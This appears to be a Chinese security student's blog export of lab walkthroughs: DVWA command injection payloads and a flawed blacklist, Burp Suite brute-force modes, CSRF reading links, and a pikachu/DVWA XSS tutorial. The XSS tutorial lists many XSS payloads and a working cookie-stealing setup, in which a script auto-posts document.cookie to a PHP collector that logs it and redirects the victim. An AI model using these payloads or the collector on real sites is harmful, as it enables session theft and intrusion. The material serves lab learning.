title="Linux系统支持的管道符如下："></a>Linux系统支持的管道符如下：</h4><ol><li>“;”：执行完前面的语句再执行后面的语句。</li><li>“|”：显示后面语句的执行结果。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。</li><li>“&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ol><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_13-27-17.png" alt></p><h2 id="DVWA演示"><a href="#DVWA演示" class="headerlink" title="DVWA演示"></a>DVWA演示</h2><p><strong>（注：我在我的DVWA搭建在我的本地机上所以下面演示是基于Windows系统cmd命令）</strong></p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><p>首先进入界面我们就能看到一个输入框并提示可以进行ping操作，那么我们就简单的试一下它的ping工能吧！</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_14-29-00.png" alt></p><p>发现功能正常并且带有回显，<strong>那我们思考一下</strong>既然这个漏洞是命令注入漏洞，那么这个漏洞攻击利用会不会和SQL注入有相似的地方。那我们就顺着这个思路试试，我们试图在正常语句后拼接攻击语句看是否回显!</p><p>我们参考刚才我给你们补充的cmd小知识构造如下命令：</p><pre><code>#这条命令的意思是：ping 127.0.0.1如果执行成功则继续执行dir127.0.0.1&amp;&amp; dir</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_14-39-27.png" alt></p><p>我们发现，我们的命令执行成功了，并且带有明显的dir回显。</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>页面还是那个页面，功能还是那个功能，没啥好说的。那咱就直接拿出刚才的payload</p><pre><code>#这条命令的意思是：ping 127.0.0.1如果执行成功则继续执行dir127.0.0.1&amp;&amp; dir</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_14-47-18.png" alt></p><p>这是怎么回事，怎么不行了，看来我们得想另一种方法了。我们重新构造一下payload</p><pre><code>#这条命令的意思是：ping 127.0.0.1不论是否执行成功都继续执行dir127.0.0.1&amp; dir</code></pre><p>发现执行成功并成功回显。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_14-52-38.png" alt></p><p>那我们还有别的方式吗？那我们接着换这个payload试试</p><pre><code>#这句解释在本文最后的扩展中解释，你可以先自行猜测一下127.0.0.1|dir</code></pre><p>咦，这个界面怎么没有ping127.0.0.1的回显，只有dir的回显，<strong>思考一下这是为什么。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_14-56-45.png" alt></p><p>那我们在试试这个payload该是如何</p><pre><code>#这句解释在本文最后的扩展中解释，你可以先自行猜测一下127.0.0.1||dir</code></pre><p>发现这个只执行了前面的ping127.0.0.1，后面的dir却没有执行回显，<strong>这是为什？</strong>是被过滤拦截了？还是这句payload本身问题？</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-04-33.png" alt></p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>有了中级的经验，我们就直接在里面输入刚才的payload直接进行测试，经测试发现</p><pre><code>#这三条payload均未执行成功127.0.0.1||dir127.0.0.1&amp;&amp;dir127.0.0.1&amp; dir</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-11-23.png" alt></p><p>只有这条payload测试成功</p><pre><code>127.0.0.1|dir</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-15-40.png" alt></p><p>有些奇怪欸。怎么这条就执行成功了。按道理来讲他应该都给过滤或禁止使用敏感字符了啊。那我们看看源码吧，看看它这个防御机制是啥。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-21-56.png" alt></p><p>看了一下这里采用了黑名单的方式禁止了敏感字符的使用，它禁止了使用 <code>|</code>符号啊，怎么还会这样呢？</p><p>看到这里很多小伙伴就该疑惑了，这是为啥？</p><p><strong>其实问题在这里</strong></p><pre class=" language-PHP"><code class="language-PHP">$substitutions = array(     '&'  => '',     ';'  => '',     '| ' => '',    //你仔细瞧瞧这''里面写的啥    '-'  => '',     '$'  => '',     '('  => '',     ')'  => '',     '`'  => '',     '||' => '', ); </code></pre><p><strong>可以看到上面的黑名单基本是十分完善了，但是<code>&#39;| &#39;</code> 这后面有个空格…这是故意留的后门吧…</strong></p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p><strong>这也不是啥扩展，就是命令行拿到cmd里去执行以下，然后再拿出来给你们瞧瞧。。。</strong></p><p>（注：我是谁，你也不想想，<strong>我可是水文小王子</strong>，我能舍得写干货？？？）</p><h3 id="payload解释"><a href="#payload解释" class="headerlink" title="payload解释"></a>payload解释</h3><pre><code>#“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。#所以这里执行完ping127.0.0.1后又执行了dir但只打印输出了dir的回显127.0.0.1|dir#“||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。#ping 127.0.0.1 肯定是对的，所以当ping127.0.0.1执行成功后这里的dir就无法执行了127.0.0.1||dir</code></pre><h3 id="cmd操作演示"><a href="#cmd操作演示" class="headerlink" title="cmd操作演示"></a>cmd操作演示</h3><p><strong>（说明：由于dir命令在cmd回显过长，所以这里我就用echo 命令演示）</strong></p><pre><code>ping 127.0.0.1</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-44-16.png" alt></p><pre><code>echo 你被hack攻击了</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-48-34.png" alt></p><pre><code>ping 127.0.0.1&amp;&amp; echo 你被hack攻击了</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-50-40.png" alt></p><pre><code>ping 127.0.0.1&amp; echo 你被hack攻击了</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-52-44.png" alt></p><pre><code>ping 127.0.0.1 | echo 你被hack攻击了</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-54-34.png" alt></p><pre><code>ping 127.0.0.1 || echo 你被hack攻击了</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-15_15-56-49.png" alt></p><h3 id="干货"><a href="#干货" class="headerlink" title="干货"></a>干货</h3><p>（注：下面是一些常用的cmd命令都在上面总结了，我就不在说了，你可以自行在cmd命令板中自行操作演示）</p><p><a href="https://wenku.baidu.com/view/ee05901da300a6c30c229f6a.html" target="_blank" rel="noopener">cmd黑客入侵命令大全</a></p><p><a href="https://www.cnblogs.com/cwsu/p/9860901.html" target="_blank" rel="noopener">CMD黑客入侵命令</a></p><p><a href="https://www.cnblogs.com/gsliuruigang/p/6481423.html" target="_blank" rel="noopener">黑客攻击常用CMD命令大全</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> DVWA_命令注入漏洞初识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuit暴力破解使用</title>
      <link href="/2020/01/29/burpsuit-bao-li-po-jie/"/>
      <url>/2020/01/29/burpsuit-bao-li-po-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于暴力破解我简单介绍一下，就仅仅说一下burpsuit的常用用法。因为关于暴力破解比较考验关于你字典存储问题，对于初级暴力破解漏洞来讲没多少技术问题。burpsuit一开丢到intrude里跑跑字典就完事了，要是有耐心或者字典够强大，基本问题不大。如果验证码是一次一用或者有token，那就得写个脚本了（或者用一个好用的工具动态提取验证码）。这个难度就稍微大点了，这里我演示的是简单漏洞用burpsuit就能解决的漏洞。</p><h2 id="burpsuit-暴力破解模块应用"><a href="#burpsuit-暴力破解模块应用" class="headerlink" title="burpsuit 暴力破解模块应用"></a>burpsuit 暴力破解模块应用</h2><h3 id="这里先给你们演示在哪能找到暴力破解模块"><a href="#这里先给你们演示在哪能找到暴力破解模块" class="headerlink" title="这里先给你们演示在哪能找到暴力破解模块"></a>这里先给你们演示在哪能找到暴力破解模块</h3><p><strong>先打开代理进行抓包，将抓到的包发给intruder模块（额，我的汉化了，你就看英文就得了）。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-05_17-38-38.png" alt></p><p><strong>然后就在这里选择爆阔模式</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-05_17-46-08.png" alt></p><h3 id="四种模式功能"><a href="#四种模式功能" class="headerlink" title="四种模式功能"></a>四种模式功能</h3><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200205182539.png" alt></p><h4 id="sniper"><a href="#sniper" class="headerlink" title="sniper"></a>sniper</h4><p>当有A,B两处爆阔点时，只用一个字典D。那么D就会在A,B两点轮番使用。这里的轮番指的是A点用完，B带点再用。</p><p>形如<strong><code>D，B</code></strong>（A,D）。</p><p>这里就是<strong><code>D，B</code></strong>样子。这里就是原本的A位置被字典代替D。<strong>但是这使的B是不变化的（看蓝色水印下的password）。</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200205191839.png" alt></p><p>这里就是<strong><code>A,D</code></strong>样子。当字典D把A位置轮完，就开始轮B。<strong>同理此时A位置不变化（看黄色水印下的username）</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200205193117.png" alt></p><h4 id="battering-ram"><a href="#battering-ram" class="headerlink" title="battering ram"></a>battering ram</h4><p>这里就是A,B位置一起被字典D替换。形如：（D，D）</p><p>username，password同时被替换字典里的内容替换。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200205194334.png" alt></p><h4 id="ptichfork"><a href="#ptichfork" class="headerlink" title="ptichfork"></a>ptichfork</h4><p>A,B分别设置一个字典D1,D2。形如（D1,D2）</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200205195227.png" alt></p><p><strong>这里我需要补充一下，轮到其中某个字典没有值可以轮时就停止</strong></p><h4 id="Cluster-bomb"><a href="#Cluster-bomb" class="headerlink" title="Cluster bomb"></a>Cluster bomb</h4><p>为A,B设置不同字典。但是A，B 同时轮番字典里的值。但是这里会让每个值都轮一遍。</p><p>如A轮D1字典里的第一个，那么B则将轮完D2字典里的全部内容。</p><p>当B轮完D2字典，则A开始轮D1字典里的第二个。。。。。。</p><p><strong>我懒省事就让A,B都是同一个字典。（这个演示字典比较小，轮的比较快）</strong></p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200205200107.png" alt></p><h3 id="判断是否成功的方法"><a href="#判断是否成功的方法" class="headerlink" title="判断是否成功的方法"></a>判断是否成功的方法</h3><p>首先我们要明确，当我们输入正确密码和输入错误密时响应头返回信息肯定不一样。</p><p>所以我们可以将返回字段长度排序，当有一个明显与其他不一样时那个就是正确的。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-github20200205201452.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> burpsuit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_水文</title>
      <link href="/2020/01/28/csrf/"/>
      <url>/2020/01/28/csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="水文说明"><a href="#水文说明" class="headerlink" title="水文说明"></a>水文说明</h2><p>关于CSRF这个没有太多的问题，漏洞也很好理解成因也很简单，我这里给出几篇文章供你们参考吧。</p><p><a href="https://www.jianshu.com/p/ee97acd077df" target="_blank" rel="noopener">CSRF漏洞详细说明</a></p><p><a href="https://www.jianshu.com/p/67408d73c66d" target="_blank" rel="noopener">安全|常见的Web攻击手段之CSRF攻击</a></p><p><a href="https://www.jianshu.com/p/855395f9603b" target="_blank" rel="noopener">WEB安全之-CSRF（跨站请求伪造）</a></p><p><a href="https://www.jianshu.com/p/0ef04198fff7" target="_blank" rel="noopener">CSRF( 跨站请求伪造)学习笔记</a></p><p><a href="https://www.freebuf.com/articles/web/186880.html" target="_blank" rel="noopener">前端安全系列（二）：如何防止CSRF攻击？  </a>                              </p><p><a href="https://www.cnblogs.com/yangzhaon/p/11048079.html" target="_blank" rel="noopener">CSRF实际操作与代码演示</a></p><p><strong>csrf一般和XSS一起联动使用攻击效果会很好</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> CSRF_参考链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_进阶</title>
      <link href="/2020/01/27/pikachu-xss/"/>
      <url>/2020/01/27/pikachu-xss/</url>
      
        <content type="html"><![CDATA[<h1 id="pikachu-XSS"><a href="#pikachu-XSS" class="headerlink" title="pikachu_XSS"></a>pikachu_XSS</h1><blockquote><p><strong>这绝对是篇假的pikachu_xss攻略</strong>，我敢保证绝对没有人会写这么水的文章。</p></blockquote><p><strong>我想说的是</strong>：这篇可能看确实起来过于杂乱无章，摸不着头脑，有些不够详尽。一方面是因为我想前几篇写的很详细，另一方面我想填一下前面几篇的坑。前面几篇力主详细和操作简单化，并未讨论一些深层次的东西。这篇我就想对前面两篇做个扩展，我想更深一层次的带大家去探究XSS利用和提升对XSS认识。</p><p><strong>（注：由于我才能不足，这里的探究也是很初级，至于对XSS认识的提升也是对于小白来说的，希望各位大佬勿怪。）</strong></p><h2 id="前言：这篇是为了提升你们对XSS攻击认识写的"><a href="#前言：这篇是为了提升你们对XSS攻击认识写的" class="headerlink" title="前言：这篇是为了提升你们对XSS攻击认识写的"></a>前言：这篇是为了提升你们对XSS攻击认识写的</h2><p><strong>基本面原理和初始我在前面两篇打DVWA的时候都已经叨叨过了，</strong></p><p><strong>那我再这里就不在BB废话了。 直接开撸╮(￣▽￣)╭</strong></p><h3 id="反射型XSS（GET）"><a href="#反射型XSS（GET）" class="headerlink" title="反射型XSS（GET）"></a>反射型XSS（GET）</h3><p>进入到界面后发现是个搜索栏，于是乎就随手。。。。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-09_22-18-28.png" alt></p><p>我擦，好像有点意思，那咱还废啥话。干它！</p><p>正当我payload的输入一半的时候，我发现突然怎么也输进去了。。。WHAT发生了什么？？？</p><p>只见我灵光一闪，嘿嘿，F12。。。（注：这里的输入框限制了前端输入最多只能20个字符，我们按照老方法F12改一下。如果忘掉具体怎么的话，那就在回翻一下我打DVWA那篇博客，这里我就不多讲了）</p><p>然后随而来的就是一个个弹窗 ｂ（￣▽￣）ｄ</p><pre class=" language-JavaScript"><code class="language-JavaScript"><svg/onload=alert(1)><iframe onload=alert(123)><body onLoad="alert('XSS');"<script>alert(/xss/)</script><img src=x onerror=alert(hack)><--`<img/src=` onerror=alert(1)> --!><iframe src="javascript:alert('xss');"></iframe><ScRiPt%20%0A%0D>alert(561177485777)%3B</ScRiPt><script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script><script ^__^>alert(String.fromCharCode(49))</script ^__^#输入这个过后会自动跳到百度<script>document.location=("http://baidu.com")</script>#下面的是需要二次触发才能弹窗<math href="javascript:javascript:alert(1)">CLICKME</math> <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>#这是我魔改过的<img width="10000px" height="10000px" src=i onmouseover="alert(document.cookie)"><iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)"></code></pre><p><strong>我就不再多举例了，这里仅仅作为扩展，自己有兴趣可以单门去收集一下XSS相关payload。</strong></p><h3 id="反射型XSS（POST）"><a href="#反射型XSS（POST）" class="headerlink" title="反射型XSS（POST）"></a>反射型XSS（POST）</h3><p><strong>相对于反射型XSS(GET)，这里只不过需要抓包然后再输入payload。这里呢，我就不给大家在做过多输入payload演示了。（注：把上边的payload直接拿过来用就行。）</strong></p><p>我是那种会水的人吗？肯定不是的啦。那么接下来我带大家思考个问题吧。</p><h4 id="思考：XSS难道就会弹窗？？？"><a href="#思考：XSS难道就会弹窗？？？" class="headerlink" title="思考：XSS难道就会弹窗？？？"></a>思考：XSS难道就会弹窗？？？</h4><p>这个问题也是我在打DVWA的时候留给学弟的问题。那今天我就在这里跟大家一起讨论一下吧。</p><p>说道xss攻击利用，<strong>对于web安全初识者</strong>来说肯定会很懵逼。xss不就是弹个窗吗，不就是能扰乱前端吗，在厉害点也就获取个cookie，那有啥特殊的。（大佬勿喷，我这里说的是小白对xss认识）</p><p>其实不然，xss漏洞的危害很大程度取决于xss漏洞发生的位置和攻击者对漏洞的利用。xss漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TP10 的排名中一直属于前三的江湖地位·。xss漏洞发生后一般是对用户造成巨大安全隐患，如发生大规模xss蠕虫事件，钓鱼事件，cookie盗取事件，浏览器劫持事件等，但有些还可以结合浏览器自身漏洞和服务器漏洞获取webshell。那我们来几个案例吧，有兴趣的话可以自行搜索一下美团的xss蠕虫事件（这个属于经典案例），QQ经常出现的盗号风波（属于时长发生在身边的），还有经常访问某些小网站会不自主跳到其他界面（这个是你最纳闷的）。</p><h4 id="思考：我们是怎样受到攻击的"><a href="#思考：我们是怎样受到攻击的" class="headerlink" title="思考：我们是怎样受到攻击的"></a>思考：我们是怎样受到攻击的</h4><p>那么我们就来测试一下这个吧。<strong>首先打开你的DVWA，并把等级设成low，接着在url栏输入这行代码。</strong></p><p><strong><code>（注：因为皮卡丘可能不是每个人都有，所以这里我就用 DVWA 来讲吧）</code></strong></p><p>将下面代码复制粘贴到url栏中。</p><pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%28%22%68%74%74%70%3a%2f%2f%62%61%69%64%75%2e%63%6f%6d%22%29%3c%2f%73%63%72%69%70%74%3e#</code></pre><p>你发现了什么？你会发现你的浏览器会先打开DVWA的界面，然后就一闪而过，最终停留在百度的界面。</p><p><strong>你仔细看看这个url结构，是不是很像一条普通访问DVWA的url。你明明是在访问DVWA,怎么就跑百度去了？？？</strong></p><p>那到底发生了什么呢？？？接着我带你一步步揭开这个问题的迷雾（到我装逼的时候了）</p><p>不知道刚才大家在对反射型XSS(GET)测试的时候有没有注意到下面这条payload</p><pre class=" language-JavaScript"><code class="language-JavaScript">#输入这个过后会自动跳到百度<script>document.location=("http://baidu.com")</script></code></pre><p>你打开DVWA的反射型XSS界面，把这段payload输入进去，你会发现似曾相识的感觉<strong>︿(￣︶￣)︿</strong>，</p><p>这是因为你又一次经历了刚才的的事<strong>(Ｔ▽Ｔ)</strong>。</p><p>你把我刚才给你的url进行解码得到如下代码</p><pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;document.location=(&quot;http://baidu.com&quot;)&lt;/script&gt;#</code></pre><p>眼不眼熟，发现问题了么你？？？</p><p><strong>这不就是我刚才让你在DVWA反射型xss那里自己输入的payload被带到了url里了吗。</strong></p><p><strong>我想说的是，</strong>有些时候我们会在不知情的情况下访问一条未知的url，就像刚才你输了我给的URL，明明看起来像是一条打开DVWA的url，却被不明其因的被带到百度。如果我给你一条能获取你cookie的url呢？那你是不是就受到了攻击啊！</p><h3 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h3><p><strong>payload还是那几条，原理我也就不详细的说了，用法呢也很简单，直接复制粘贴得了。</strong></p><p>唉，我也不想水，谁让我原先讲的很详细呢。没办法啊<strong>(ಥ_ಥ)</strong></p><p>难道我是那种写文章会水的人？？？这么好的学习机会那咱也别闲着</p><h4 id="思考：那么我们的cookie是怎么被获取的呢"><a href="#思考：那么我们的cookie是怎么被获取的呢" class="headerlink" title="思考：那么我们的cookie是怎么被获取的呢"></a>思考：那么我们的cookie是怎么被获取的呢</h4><p><strong>首先打开你的DVWA，并把等级设成low，接着在url栏输入这行代码。</strong></p><p><code>（注：因为皮卡丘可能不是每个人都有，所以这里我就用 DVWA 来讲吧）</code></p><p>将下面代码复制粘贴到url栏中。（<strong>首先声明</strong>，这只是一条普通的会弹窗的xss而已，并不会对你发起攻击）</p><pre><code>http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e</code></pre><p>你会发现我去，他怎弹出了你的cookie啊，你什么都没干啊。这是怎回事？？？</p><p>老样子，这条url绝对不正经，经过url解码你会发现我给你发送的是一条这样的payload，如下</p><pre><code>http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;#</code></pre><p><strong>回到我们的问题，</strong>我们研究的问题是怎样盗取cookie。那么经过刚才的事例，我想你会发现，你通过浏览不知名的url导致浏览器弹出你的DVWA的cookie。那么同理如果攻击者给你一条会获取你cookie并发送到远程主机的xss payload，当你在不知情点击这条url的时候，那攻击者是不是就直接获取到你的cookie了呢。</p><h4 id="思考：我们怎么能实现盗取cookie并保存"><a href="#思考：我们怎么能实现盗取cookie并保存" class="headerlink" title="思考：我们怎么能实现盗取cookie并保存"></a>思考：我们怎么能实现盗取cookie并保存</h4><p>既然要盗取cookie并保存，那么我们就需要一个能想远端主机发送cookie的payload和一个能接受cookie的环境。那么接下来请跟着我的步骤一步步动手搭建吧。（<strong>先打开你的DVWA，并把等级设成low，</strong>）</p><p><strong>（注：我这里将接受cookie的代码还放在了本地，为了降低你们你们的操作难度）</strong></p><p>首先现在你网站根目录下创建一个XSS_cookie的目录</p><p>然后再创建一个cookie.js  将下面代码复制到cookie.js 里面并保存</p><pre class=" language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;form action='http://127.0.0.1/XSS_cookie/record.php' name='exploit' method='post' style='display:none'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;input type='hidden' name='data' value='"</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">+</span><span class="token string">"'>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"&lt;/form>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>exploit<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接着我们再创建一个接受cookie的PHP脚本命名为record.php ， 将下面代码复制到record.php  里面并保存。</p><p>（注：这各个脚本也是放在XSS_cookie的目录下面）</p><pre class=" language-PHP"><code class="language-PHP"><?phpheader("content-type:text/html;charset=utf-8");$conn=mysql_connect("localhost","root","root");mysql_select_db("XSS_cookie",$conn);if(isset($_GET['data'])){    $sql="insert into record(cookie) values('".$_GET['data']."');";    $result=mysql_query($sql,$conn);    mysql_close();}else if(isset($_POST['data'])){    $sql="insert into record(cookie) values('".$_POST['data']."');";    $result=mysql_query($sql,$conn);    mysql_close();}else{    $sql="select * from record";    $result=mysql_query($sql,$conn);    while($row=mysql_fetch_array($result))    {        echo "获取到的cookie:".$row[1]."</br>";    }    mysql_close();}header("Location:http://127.0.0.1/DVWA");//重定向到一个可信的网站，让受害者不知情?></code></pre><p>接着我们打打开cmd,进入到mysql中依次输入以下命令</p><pre class=" language-mysql"><code class="language-mysql">create database XSS_cookie;use XSS_cookie;create table record(id int not null auto_increment primary key,cookie varchar(100) not null);</code></pre><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_13-31-58.png" alt></p><p>好了我们一切环境都妥当了。那么就请你复制下面的url并打开吧。</p><pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%2f%58%53%53%5f%63%6f%6f%6b%69%65%2f%63%6f%6f%6b%69%65%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e%23</code></pre><p>你会发现你进入到了DVWA的首届面，但是你这url不像是进入首界面的啊。</p><p>那接着你在mysql中查询record中的数据，你会发现你的cookie在不知情的情况下被记录保存了</p><p>(注：我测试了两次所以会有两条，你们初次测试只有一条，也就是没测试一次记录一条。)</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_13-35-18.png" alt></p><p>这到底是什么原因呢？？？按照前两次对url解码探究的经验，我们得到如下url</p><pre><code>127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script src=http://127.0.0.1/XSS_cookie/cookie.js&gt;&lt;/script&gt;#</code></pre><p>发现是个反射型xss攻击，SRC指向的URL绝对有猫腻，那么我们追踪看一下，这个是指向我刚才让你在网站跟目下建的XSS_cookie 的文件夹里的cookie.js.这段个cookie.js会打开record.php，而record.php这个脚本就会记录下你的cookie。</p><p><strong>我想说的是：</strong>你设想一下，如果这XSS_cookie这个目录及脚本被放在了攻击者的远端服务器下，你再访问这个相应的文件的时候你说会怎样？那你的cookie是不是就被保存到了攻击者的远端服务器下了，那么攻击者就可以拿着你的cookie伪装成你的身份去访问网页了。</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_00-28-24.png" alt></p><p>（<strong>注：其实本该用两台机器完成的，</strong>但是我为了降低你们复现的难度就简化了攻击流程，单门设计了这个能在本地就完成的测试。那就委屈一下你的电脑吧，既要当受害者还要当攻击者，唉，它太难了。<strong>答应我等你复现成功后记得安慰一下你的电脑。</strong>）</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>虽然上篇关于DVWA_DOM_XSS讲的很详尽，但是我不能再水了，再水我的心会难受。呜呜。。。我是一个有良心的作者</p><p><strong>（DOM型XSS种类繁多，情景也各种各样，那接着我就在再次带领你们温习一下吧）</strong></p><h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM_XSS_"></a>DOM_XSS_</h4><p>首先进入界面，发现是个常规的搜索栏，那我们就随便输点东西吧，F12看看</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_14-23-10.png" alt></p><p>发现我们输入的东西被存到了a标签的herf 属性里面。然后还发现一段绿色水印下的一段js 代码，如下：</p><pre class=" language-JavaScript"><code class="language-JavaScript"><script>  function domxss(){     var str = document.getElementById("text").value;     document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";      }                    //在这里我们将变量str 的前面的" ' 还有a标签的> 闭合                             //试试：'><img src="#" onmouseover="alert('xss')">                          //试试：' onclick="alert('xss')">,闭合掉就行</script></code></pre><p>不难发现这个地方存在DOM型XSS，那我们简单分析一下代码吧</p><p>我们输入的东西，经提交过后被赋值给变量str，str在将参数传到a标签的herf 属性里面。这里没有任何安全防范措施。那么，我们就以这为入手点构建闭合的前端代码生成payload。<strong>（ 构建方法在注释里）</strong></p><p><strong>下面是测试payload</strong></p><pre class=" language-JavaScript"><code class="language-JavaScript">需要点击二次触发#' onclick="alert(/xss/)"需要鼠标移动到图片上（魔改版）'><img width="10000px" height="10000px"  src="#" onmouseover="alert('xss')" >直接触发xss（魔改版）" '><svg/onload=alert(1)></code></pre><p><strong>接下来我们再来一个DOM演示</strong></p><h4 id="DOM-XSS-X"><a href="#DOM-XSS-X" class="headerlink" title="DOM_XSS_X"></a>DOM_XSS_X</h4><p>进入后和刚才的界面一样，于是乎我随手就一个123456.。。。欸，有意思，看来鲨师傅是个有故事的人啊。。。                      嘿嘿，老样子F12一下看看前端代码，如下图所示</p><p><img src="https://raw.githubusercontent.com/Lu-sakura/images/master/bolg_file/images/picgo-githubSnipaste_2020-02-10_15-44-17.png" alt></p><p>发现我们原先将的反射型XSS有点相似啊，再看绿色水印下有一段JavaScript代码，那我们一起看看吧</p><pre class=" language-JavaScript"><code class="language-JavaScript"><script>    function domxss(){        var str = window.location.search;        var txss = decodeURIComponent(str.split("text=")[1]);        var xss = txss.replace(/\+/g,' ');        document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";        }           //在这里我们将变量xss的前面的" ' 还有a标签的> 闭合                       //试试：'><img src="#" onmouseover="alert('xss')">                    //试试：' 